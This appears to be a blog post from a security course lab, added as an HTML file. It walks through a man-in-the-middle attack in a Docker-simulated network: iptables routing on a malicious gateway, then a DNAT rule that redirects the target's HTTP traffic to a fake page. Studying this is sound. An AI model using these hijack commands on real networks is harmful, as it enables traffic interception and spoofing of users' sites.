@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">Malicious Gateway</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>This post describes how to exploit control of the gateway a target uses in order to monitor traffic.
+In this scenario, Mallory is the default gateway allowing the target Alice to connect to the external network.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#routing-the-traffic" id="markdown-toc-routing-the-traffic">Routing the Traffic</a></li>
+  <li><a href="#hijacking-the-traffic" id="markdown-toc-hijacking-the-traffic">Hijacking the Traffic</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>As we’ve done previously, we use <a href="https://docs.docker.com/compose/">docker-compose</a>
+to simulate the network.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">alice</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">internal</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
+    <span class="na">cap_add</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+
+  <span class="na">mallory</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">mallory</span>
+      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span>
+      <span class="na">cap_add</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+        <span class="pi">-</span> <span class="s">SYS_ADMIN</span>
+      <span class="na">volumes</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s">.:/shared</span>
+      <span class="na">networks</span><span class="pi">:</span>
+        <span class="na">internal</span><span class="pi">:</span>
+          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.3</span>
+        <span class="na">external</span><span class="pi">:</span>
+          <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.1.3</span>
+  
+  <span class="na">wireshark</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">wireshark</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">network_mode</span><span class="pi">:</span> <span class="s">service:mallory</span>
+
+<span class="na">networks</span><span class="pi">:</span>
+  <span class="na">internal</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/24</span>
+  <span class="na">external</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+       <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.1.0/24</span>
+</code></pre></div></div>
+
+<p>For the purpose of demonstration, Alice is configured such that Mallory is the default
+gateway</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env bash</span>
+
+<span class="nb">echo</span> <span class="s1">'nameserver 8.8.8.8'</span> <span class="o">&gt;</span> /etc/resolv.conf
+ip route del default
+ip route add default via 10.0.0.3
+</code></pre></div></div>
+
+<p>and is set to simply send requests to a server repeatedly.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">request</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://welcome.seclab.space/</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">const</span> <span class="nx">TIMEOUT</span> <span class="o">=</span> <span class="mi">5000</span>
+
+<span class="kd">var</span> <span class="nx">do_request</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">request</span><span class="p">.</span><span class="kd">get</span><span class="p">({</span><span class="na">url</span><span class="p">:</span> <span class="nx">url</span><span class="p">,</span> <span class="na">timeout</span><span class="p">:</span> <span class="nx">TIMEOUT</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>We can start Alice with</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compose up alice
+</code></pre></div></div>
+
+<p>since her gateway (mallory) is not up, Alice times out on her requests</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice        | { Error: ETIMEDOUT
+alice        |     at Timeout.&lt;anonymous&gt; (/home/nodejs/app/node_modules/request/request.js:848:19)
+alice        |     at ontimeout (timers.js:436:11)
+alice        |     at tryOnTimeout (timers.js:300:5)
+alice        |     at listOnTimeout (timers.js:263:5)
+alice        |     at Timer.processTimers (timers.js:223:10) code: 'ETIMEDOUT', connect: true }
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="routing-the-traffic">Routing the Traffic</h2>
+
+<hr />
+
+<p>In a separate terminal, we first set up Mallory to route traffic normally. To run a command under Mallory we use</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec -it mallory bash
+</code></pre></div></div>
+
+<p>Commands which start with <code class="language-plaintext highlighter-rouge">#</code> are run within the container. We now do the following
+using <a href="https://linux.die.net/man/8/iptables">iptables</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># iptables -F
+# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+# iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT
+# iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
+</code></pre></div></div>
+
+<p>where the options used are:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-F</code> flushes the selected chain (deletes the rules)</li>
+  <li><code class="language-plaintext highlighter-rouge">-t</code> specifies the packet matching table to operate on
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">nat</code> built-ins are <code class="language-plaintext highlighter-rouge">PREROUTING</code>, <code class="language-plaintext highlighter-rouge">OUTPUT</code>, and <code class="language-plaintext highlighter-rouge">POSTROUTING</code></li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">-A</code> appends rules to the end of the selected chain</li>
+  <li><code class="language-plaintext highlighter-rouge">-i</code> name of an interface via a packet is received</li>
+  <li><code class="language-plaintext highlighter-rouge">-o</code> name of an interface via a packet will be sent</li>
+  <li><code class="language-plaintext highlighter-rouge">-p</code> the protocol of the rule/packet</li>
+  <li><code class="language-plaintext highlighter-rouge">-m</code> allows use of modules for example the <code class="language-plaintext highlighter-rouge">state</code> module to filter based on state</li>
+  <li><code class="language-plaintext highlighter-rouge">-j</code> “jump” specifies what to do if a packet matches the rule or “target”
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">ACCEPT</code> simply let the packet though</li>
+      <li><code class="language-plaintext highlighter-rouge">DNAT</code> specifies the packet’s destination should be changed to the one
+specified by <code class="language-plaintext highlighter-rouge">--to-destination</code></li>
+      <li><code class="language-plaintext highlighter-rouge">MASQUERADE</code> allows other connected machines to reach the internet
+even though they may not have an assigned public IP. More info
+can be found <a href="https://www.frozentux.net/iptables-tutorial/chunkyhtml/x4422.html">here</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p>Alice should now be printing</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice        | [200] Welcome to SecLab
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="hijacking-the-traffic">Hijacking the Traffic</h2>
+
+<hr />
+
+<p>As Mallory, we can create a site and host local server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cd shared
+# echo -n "Welcome to DarkLab" &gt; index.html
+# python2.7 -m SimpleHTTPServer 8080
+</code></pre></div></div>
+
+<p>Open up another shell for Mallory and hijack the traffic</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># iptables -t nat -A PREROUTING -p tcp -i eth1 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080
+</code></pre></div></div>
+
+<p>Alice is now receiving the manufactured site and we have established a Man-in-the-Middle</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice        | [200] Welcome to DarkLab
+</code></pre></div></div>
+
+<p>Some documentation used includes</p>
+<ul>
+  <li><a href="https://tldp.org/HOWTO/IP-Masquerade-HOWTO/ipmasq-background2.1.html">TLDP</a></li>
+  <li><a href="https://linux.die.net/man/8/iptables">iptables</a></li>
+</ul>
+
+<p>When you’re done, don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
